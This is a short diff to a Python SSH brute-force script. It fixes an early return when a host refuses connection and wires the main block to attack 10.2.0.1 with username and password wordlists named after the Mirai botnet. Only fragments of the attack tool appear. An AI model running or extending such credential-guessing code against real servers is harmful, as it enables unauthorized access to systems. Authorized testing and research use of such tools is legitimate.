@@ -49,7 +49,8 @@ def ssh_brute_force(ip_address, host_list, pass_list):
                 print(f"\t- password: {passwd}")
                 return 0
             elif ret == 2:
-                break
+                # host refuses connection
+                return 
             else:
                 continue
 
@@ -58,5 +59,5 @@ if __name__=='__main__':
     ip = "10.2.0.1"
     users = read_file_to_list("./wordlists/mirai_users.txt")
     passwords = read_file_to_list("./wordlists/mirai_passwords.txt")
-    ssh_brute_force()
+    ssh_brute_force(ip, users, passwords)
 
